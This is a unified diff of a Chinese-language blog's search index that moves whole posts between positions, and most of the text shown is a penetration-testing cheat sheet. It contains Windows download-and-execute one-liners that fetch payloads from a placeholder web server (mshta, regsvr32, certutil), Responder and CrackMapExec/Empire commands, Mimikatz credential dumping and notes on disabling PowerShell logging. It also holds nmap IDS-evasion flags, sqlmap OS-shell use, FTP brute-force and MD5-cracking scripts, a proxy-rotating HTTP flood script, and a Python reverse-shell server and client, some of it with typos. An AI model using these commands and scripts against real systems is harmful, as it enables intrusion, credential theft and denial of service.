@@ -1,270 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HACKER-USEFUL-GUIDE</title>
-    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
-<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
-<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
-<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
-<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
-<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
-<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
-<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
-<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
-</ul>
-<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
-<li>Burp Suite</li>
-<li>OWASP ZAP（开源）</li>
-<li>Dirbuster</li>
-<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
-</ol>
-<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
-<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
-<li>分两部分：服务器，攻击静荷</li>
-<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
-<li>XSS Hunter工具验证盲XSS</li>
-</ol>
-</li>
-</ol>
-<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
-<li>Responder工具<ol>
-<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
-</ol>
-</li>
-<li>MultiRelay.py</li>
-</ol>
-<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
-<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
-<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
-</ol>
-<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
-<li>（针对win10）Mimikatz</li>
-<li>（针对浏览器）Mimikittenz</li>
-</ol>
-<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
-<li>RC脚本自动化Metasploit</li>
-<li>Empire自动化</li>
-<li>Conbalt Strike自动化</li>
-</ol>
-<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
-<li>禁用powershell日志记录</li>
-</ol>
-<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
-<li>利用windows“功能”：<ul>
-<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
-<li><code>mshta http://webserver/payload.hta</code></li>
-<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
-<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
-<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
-</ul>
-</li>
-</ol>
-<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
-<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
-<li>C:&gt;<code>..\psgetsys.psl</code></li>
-<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>WEB渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>网络空间安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LINUX-PENETRATION</title>
-    <url>/2021/12/25/LINUX-PENETRATION/</url>
-    <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
-<li>IDS（Intrusion Detection Systems）入侵检测系统</li>
-<li>NMAP逃逸方案：<ol>
-<li>报文分段：<code>nmap -f [IP]</code> &#x2F;&#x2F;将TCP头分段在几个包中，使过滤器、IDS以及其他工具检测更加困难</li>
-<li>指定最大传输单元（MTU,Maximum Transmission Unit）：<code>nmap --mtu [num] [IP]</code> 设定TCP&#x2F;IP协议传输数据时最大传输单元，有效实现逃逸</li>
-<li>隐蔽扫描：<code>nmap -D RND:[num] [IP]</code> “-D”启动隐蔽扫描，让目标主机认为是利用诱饵进行扫描而非本机，实现隐藏自身IP。（应对方式：路由跟踪、响应丢弃等）</li>
-<li>源地址欺骗：<code>nmap -sI [www.baidu.com:80] [IP]</code> 伪造一个地址作为发起扫描的源地址</li>
-<li>源端口欺骗：<code>nmap --source-port [num] [IP]</code> 指定一个随机端口，通过该端口发送数据</li>
-<li>MAC地址欺骗：<code>nmap -sT --spoof-mac [MAC] [IP]</code></li>
-<li>附加随机数据：<code>nmap --data-length [num] [IP]</code> 参杂一些随机数据影响防火墙判断</li>
-</ol>
-</li>
-</ol>
-<h2 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h2><h3 id="1-信息收集脚本"><a href="#1-信息收集脚本" class="headerlink" title="1. 信息收集脚本"></a>1. 信息收集脚本</h3><ol>
-<li>IP信息：<code>nmap --script ip-geolocation-* [IP]</code></li>
-<li>Whois：<code>nmap --script whois [site]</code></li>
-<li>IP反查：<code>nmap --script hostmap-ip2hosts [site]</code></li>
-</ol>
-<h3 id="2-漏洞扫描脚本"><a href="#2-漏洞扫描脚本" class="headerlink" title="2. 漏洞扫描脚本"></a>2. 漏洞扫描脚本</h3><ol>
-<li>windows系统主机漏洞扫描：<code>nmap --script smb-check-vulns.nse -p [IP]</code></li>
-<li>web漏洞扫描：<code>nmap -sV --script=vulscan/vulscan.nse [IP]</code> Vulscan漏洞扫描高级脚本，包含CVE\OSVDB\Exploit-db\openvas多个平台指纹数据，具备离线扫描功能。（<a href="http://www.computec.ch/projekte/vulscan/?s=download" title="http://www.computec.ch/projekte/vulscan/?s=download">脚本地址</a>存放于目录\nmap\scripts\下）</li>
-</ol>
-<h3 id="3-渗透测试脚本"><a href="#3-渗透测试脚本" class="headerlink" title="3. 渗透测试脚本"></a>3. 渗透测试脚本</h3><ol>
-<li>FTP服务审计：<code>nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 [IP]</code> 通过设定的字典对FTP爆破</li>
-<li>Wordpress密码审计：<code>nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt [IP]</code> &#x2F;&#x2F; 可通过设定线程数量提高破解速度：<code>--script-args http-wordpress.threads=[num]</code></li>
-<li>数据库安全审计：<code>nmap -p80 --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=username.txt,passdb=passwd.txt [IP]</code> (MySQL操作一致)</li>
-</ol>
-<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol>
-<li><code>sqlmap -u URL --tables</code></li>
-</ol>
-<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><ol>
-<li>实质：使用了ASP一类的动态脚本实现</li>
-<li>存在漏洞位置加 “ * ”：<code>sqlmap -u URL/id/40*.html --dbs</code></li>
-</ol>
-<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol>
-<li>产生来源：request方法，用户可从提交的参数中获取参数值</li>
-<li><code>sqlmap -u &quot;http://xxx.xxx.xxx/shownews.asp&quot; --cookie &quot;id=25&quot; --tables --level 2</code><ol>
-<li>将URL分段</li>
-<li>使用<code>--cookie</code>进行连接</li>
-<li>设置<code>--level</code>等级2级以上</li>
-</ol>
-</li>
-</ol>
-<h2 id="POST类型注入"><a href="#POST类型注入" class="headerlink" title="POST类型注入"></a>POST类型注入</h2><ol>
-<li>产生来源：（搜索框、登录框）对POST过滤不严</li>
-<li>操作步骤：<ol>
-<li>方法一：<ol start="2">
-<li>获取表单信息进行分析：找出输入框对应参数变量</li>
-<li>使用<code>--data</code>指定注入点：<code>sqlmap -u http://xxx/Login.asp --data &quot;[Name]=1&amp;[Password]=1&quot;</code></li>
-</ol>
-</li>
-<li>方法二：<ol>
-<li>使用<code>--forms</code>sqlmap自动获取相关信息，查看输出结果<code>Payload:</code>处：<code>sqlmap -u http://domain/Login.asp --forms</code></li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h2 id="防火墙逃逸"><a href="#防火墙逃逸" class="headerlink" title="防火墙逃逸"></a>防火墙逃逸</h2><ol>
-<li>方案一：<code>--delay 1</code>使用延迟方法逃逸</li>
-<li>方案二：<code>--tamper &quot;xxx.py&quot;</code>执行逃逸脚本（默认脚本位置：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;）</li>
-</ol>
-<h2 id="命令执行与维持访问"><a href="#命令执行与维持访问" class="headerlink" title="命令执行与维持访问"></a>命令执行与维持访问</h2><ol>
-<li>产生来源：开发者配置问题，不限制数据库权限，注入点未添加权限限制</li>
-<li><code>--os-cmd=xxx</code></li>
-<li><code>--os-shell</code></li>
-</ol>
-<h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><h3 id="1-proxy-gt-gt-Intercept"><a href="#1-proxy-gt-gt-Intercept" class="headerlink" title="1. proxy&gt;&gt;Intercept"></a>1. proxy&gt;&gt;Intercept</h3><ol>
-<li>forwar</li>
-<li>drop：放弃当前数据</li>
-<li>intercept is on&#x2F;off：开关</li>
-<li>Raw：请求地址、http协议版本、主机头、浏览器信息、cookie、网页内容等信息</li>
-<li>Params：GET请求、POST请求、Cookie参数</li>
-<li>Hex：显示Raw选项的16进制内容</li>
-</ol>
-<h3 id="2-密码安全审计（Intruder）"><a href="#2-密码安全审计（Intruder）" class="headerlink" title="2. 密码安全审计（Intruder）"></a>2. 密码安全审计（Intruder）</h3><ol>
-<li>Action &gt;&gt; Send to Intruder</li>
-<li>Positions:<ol>
-<li>Add$：选中内容设置为变量</li>
-<li>Clean$：重置变量</li>
-<li>Auto$：自动选取变量</li>
-<li>Refresh</li>
-<li>Attack type:<ol>
-<li>Sniper：适合只有一个变量，每次填入一个参数进行审计</li>
-<li>Battering ram：用于两个及以上的变量，在一个字典文件中提取一个值覆盖多个变量进行审计</li>
-<li>Pitchfork：在两个字典文件中提取一对或一个值覆盖变量</li>
-<li>Cluster bomb：使用两个字典进行排列组合并进行审计</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>Payloads：设置payload模式，配置字典</li>
-<li>start attack：观察len长度，进行筛选</li>
-</ol>
-<h3 id="3-重放攻击"><a href="#3-重放攻击" class="headerlink" title="3. 重放攻击"></a>3. 重放攻击</h3><ol>
-<li>intruder 传递审计结果到 repeater ：重放发送，查看响应内容</li>
-<li>proxy 上传数据（木马）传递到 repeater 进行数据欺骗：修改文件类型验证信息，进行重放攻击验证（当目标服务器配置了文件格式限制）<ul>
-<li>扩展名验证：<code>filename=&quot;xxx.php&quot;</code></li>
-<li>MINI类型验证：<code>Content-Type:</code>2. 文件头校验&#x2F;文件完整性验证：插入真实的[图片文件]</li>
-</ul>
-</li>
-</ol>
-<h3 id="4-响应比较"><a href="#4-响应比较" class="headerlink" title="4. 响应比较"></a>4. 响应比较</h3><ol>
-<li>Comparer：自动高亮功能方便比较</li>
-</ol>
-<h3 id="5-Web漏洞脚本安全审计：Taget-gt-gt-scan"><a href="#5-Web漏洞脚本安全审计：Taget-gt-gt-scan" class="headerlink" title="5. Web漏洞脚本安全审计：Taget &gt;&gt; scan"></a>5. Web漏洞脚本安全审计：Taget &gt;&gt; scan</h3><h3 id="6-cookie安全性随机分析：Sequencer"><a href="#6-cookie安全性随机分析：Sequencer" class="headerlink" title="6. cookie安全性随机分析：Sequencer"></a>6. cookie安全性随机分析：Sequencer</h3><h3 id="7-编码解码器：Decoder"><a href="#7-编码解码器：Decoder" class="headerlink" title="7. 编码解码器：Decoder"></a>7. 编码解码器：Decoder</h3><h3 id="8-第三方模块：Extender"><a href="#8-第三方模块：Extender" class="headerlink" title="8. 第三方模块：Extender"></a>8. 第三方模块：Extender</h3><h1 id="BeFF测试Xss漏洞"><a href="#BeFF测试Xss漏洞" class="headerlink" title="BeFF测试Xss漏洞"></a>BeFF测试Xss漏洞</h1><h1 id="Develop-Penetration-Tools"><a href="#Develop-Penetration-Tools" class="headerlink" title="Develop Penetration Tools"></a>Develop Penetration Tools</h1><h2 id="1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）"><a href="#1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）" class="headerlink" title="1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）"></a>1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ftplib import FTP</span><br><span class="line">def ftp_login(host,username,password)</span><br><span class="line">    try:</span><br><span class="line">        ftp=FTP()</span><br><span class="line">        ftp.connect(host,21)</span><br><span class="line">        ftp.login(username,password)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        print(&quot;[+]Sucess Password:&quot;,password)</span><br><span class="line">    except:</span><br><span class="line">            pass</span><br><span class="line">def ftp_try(host,username,password):</span><br><span class="line">    for i in open(password):</span><br><span class="line">        ftp_login(host,username,i.strip())</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    ftp_try(&#x27;192.168.0.1&#x27;,&#x27;admin&#x27;,&#x27;/home/password.txt&#x27;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-MD5破解程序（彩虹表碰撞、穷举法）"><a href="#2-MD5破解程序（彩虹表碰撞、穷举法）" class="headerlink" title="2. MD5破解程序（彩虹表碰撞、穷举法）"></a>2. MD5破解程序（彩虹表碰撞、穷举法）</h2><ol>
-<li><p>python提供了hashlib模块，对明文进行MD5加密</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hshlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(&#x27;Python&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">print(md5.hexidigest())</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>程序思路：取出字典中的明文，使用hashlib进行加密，加密结果与密文进行对比，一致打印明文，不一致则继续循环。</p>
-<ol>
-<li>hashlib加密明文</li>
-<li>datatime计算程序运行时间</li>
-<li>sys获取输入的密文</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import datetime</span><br><span class="line">import sys</span><br><span class="line">name=sys.argv[1]</span><br><span class="line">starttime=datetime.datetime.now()</span><br><span class="line">for i in open(r&#x27;C:/123.txt&#x27;):</span><br><span class="line">    rs=i.strip()</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(rs.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    newmd5 = md5.hexdigest()</span><br><span class="line">    if newmd5 == name:</span><br><span class="line">        print(&quot;解密成功！明文是：&quot;,rs)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print(endtime-starttime)      </span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="3-Web密码安全审计工具"><a href="#3-Web密码安全审计工具" class="headerlink" title="3. Web密码安全审计工具"></a>3. Web密码安全审计工具</h2><h2 id="4-ChallengeCallapsar压力测试（CC：WEB-DDOS）"><a href="#4-ChallengeCallapsar压力测试（CC：WEB-DDOS）" class="headerlink" title="4. ChallengeCallapsar压力测试（CC：WEB DDOS）"></a>4. ChallengeCallapsar压力测试（CC：WEB DDOS）</h2><ol>
-<li><p>原理：多线程模拟多合法用户，确保有大量可用的代理地址</p>
-</li>
-<li><p>操作思路：</p>
-<ol>
-<li><p>引入urllib、threading模块，将获取的代理地址以列表方式存储（代理地址可采取爬虫方式批量获取）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">import threading</span><br><span class="line">url = &quot;http://www.xxxx.com/&quot;</span><br><span class="line">proxies=[&quot;114.xxx.xxx.xx:xxxx&quot;,&quot;xxx.xxx.xxx.xxx:xxxx&quot;,&quot;xxx.xxx.xxx:xxxx&quot;]</span><br><span class="line">class cc(threading.Thread):</span><br><span class="line">def __init__(self,url,proxies):</span><br><span class="line">  super(cc,self).__init__()</span><br><span class="line">  self.url=url</span><br><span class="line">  self.proxies=proxies</span><br><span class="line">  self.start()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>CC函数定义</p>
-<ol>
-<li>request.ProxyHandler()函数设置代理服务器</li>
-<li>build_opener()函数创建自定义Opener对象</li>
-<li>Install_opener()函数创建opener</li>
-<li>可选择使用random.choice()随机选择代理地址，可呈现不规则方式，躲避目标防火墙</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># class cc(threading,Thread):</span><br><span class="line">def run(self):</span><br><span class="line">while True:</span><br><span class="line">  try:</span><br><span class="line">      pro_random = random.choice(self.proxies)</span><br><span class="line">      pro_support = request.ProxyHandler(&#123;&quot;http&quot;:pro_random&#125;)</span><br><span class="line">      opener = request.build_opener(pro_support)</span><br><span class="line">      request.install_opener(opener)</span><br><span class="line">      request.urlopen(self.url)</span><br><span class="line">  except:</span><br><span class="line">          pass</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行循环</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(5000):</span><br><span class="line">cc(url.proxies)</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-<h2 id="5-后渗透（维持访问）：TCP反向连接"><a href="#5-后渗透（维持访问）：TCP反向连接" class="headerlink" title="5. 后渗透（维持访问）：TCP反向连接"></a>5. 后渗透（维持访问）：TCP反向连接</h2><ol>
-<li><p>服务端：</p>
-<ol>
-<li>导入socket模块</li>
-<li>安装并绑定套接字，允许最大连接数100，超出则拒绝</li>
-<li>通过一个while循环来接受并发送用户执行的命令</li>
-<li>将结果接收回来并打印</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;&#x27;,1234))</span><br><span class="line">s.listen(100)</span><br><span class="line">conn,addr = s.accept()</span><br><span class="line">while 1:</span><br><span class="line"> command = input(&#x27;......&gt;&#x27;)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     conn.send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     if command == &#x27;&#x27;:</span><br><span class="line">         continue</span><br><span class="line">     conn,send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     result = conn.recv(1024)</span><br><span class="line">     print(result.decode(&#x27;gbk&#x27;,&#x27;ignore&#x27;))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>客户端</p>
-<ol>
-<li>使用subprocess执行获得的用户命令</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess as sp,sys,re</span><br><span class="line">conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">conn.connect((&#x27;127.0.0.1&#x27;,1234))</span><br><span class="line">while 1:</span><br><span class="line"> command = conn.renv(1024)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     sh = sp.Popen(command.decode(&#x27;gbk&#x27;),shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)</span><br><span class="line">     out,err=sh.communicate()</span><br><span class="line">     conn.send(out)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>WEB渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>网络空间安全</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MY FAVOR TOOLS BANK (我的&quot;武器/装备&quot;库)</title>
-    <url>/2022/03/22/My-Attack-Tools/</url>
-    <content><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="JOPLIN"><a href="#JOPLIN" class="headerlink" title="JOPLIN"></a>JOPLIN</h2><h2 id="ANKI"><a href="#ANKI" class="headerlink" title="ANKI"></a>ANKI</h2><h2 id="MARKTEST"><a href="#MARKTEST" class="headerlink" title="MARKTEST"></a>MARKTEST</h2><h2 id="RIME"><a href="#RIME" class="headerlink" title="RIME"></a>RIME</h2><h2 id="ASF"><a href="#ASF" class="headerlink" title="ASF"></a>ASF</h2><h2 id="Virtualbox"><a href="#Virtualbox" class="headerlink" title="Virtualbox"></a>Virtualbox</h2><h2 id="PotPlayer"><a href="#PotPlayer" class="headerlink" title="PotPlayer"></a>PotPlayer</h2><h2 id="Neat-Download-Manager"><a href="#Neat-Download-Manager" class="headerlink" title="Neat Download Manager"></a>Neat Download Manager</h2><h2 id="OllyDBG"><a href="#OllyDBG" class="headerlink" title="OllyDBG"></a>OllyDBG</h2><h1 id="商业软件（部分含community版）"><a href="#商业软件（部分含community版）" class="headerlink" title="商业软件（部分含community版）"></a>商业软件（部分含community版）</h1><h2 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><h2 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h2><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><h2 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h2><h2 id="Visual-Studio-IDE"><a href="#Visual-Studio-IDE" class="headerlink" title="Visual Studio IDE"></a>Visual Studio IDE</h2>]]></content>
-      <categories>
-        <category>开源项目</category>
-        <category>software</category>
-      </categories>
-      <tags>
-        <tag>tools</tag>
-        <tag>open source</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>LINUX OS</title>
     <url>/2022/03/22/LINUX-OS/</url>
     <content><![CDATA[<h1 id="Linux系统基础"><a href="#Linux系统基础" class="headerlink" title="Linux系统基础"></a>Linux系统基础</h1><ol>
@@ -479,8 +215,8 @@
         <category>LINUX OS</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>操作系统</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1135,6 +871,270 @@
       <tags>
         <tag>程序开发安全</tag>
         <tag>编程语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HACKER-USEFUL-GUIDE</title>
+    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
+<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
+<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
+<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
+<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
+<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
+<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
+<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
+<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
+</ul>
+<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
+<li>Burp Suite</li>
+<li>OWASP ZAP（开源）</li>
+<li>Dirbuster</li>
+<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
+</ol>
+<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
+<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
+<li>分两部分：服务器，攻击静荷</li>
+<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
+<li>XSS Hunter工具验证盲XSS</li>
+</ol>
+</li>
+</ol>
+<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
+<li>Responder工具<ol>
+<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
+</ol>
+</li>
+<li>MultiRelay.py</li>
+</ol>
+<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
+<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
+<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
+</ol>
